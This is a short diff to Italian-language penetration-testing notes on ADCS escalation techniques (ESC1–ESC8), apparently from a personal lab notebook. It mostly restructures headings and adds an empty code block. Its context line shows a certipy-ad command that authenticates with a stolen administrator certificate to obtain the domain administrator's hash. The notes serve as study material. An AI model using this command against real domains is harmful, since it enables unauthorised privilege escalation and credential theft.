@@ -228,8 +228,12 @@ Usando poi il certificato ottieni l'hash dell'amministratore
 certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12
 ```
 ![[Pasted image 20230828150041.png]]
-### **ESC 2 & 3 - ADCS**
+### **ESC 2 - ADCS**
 
+```bash
+
+```
+### **ESC 3 - ADCS**
 ### **ESC 4 - ADCS**
 ### **ESC 6 - ADCS**
 ### **ESC 8 - ADCS**
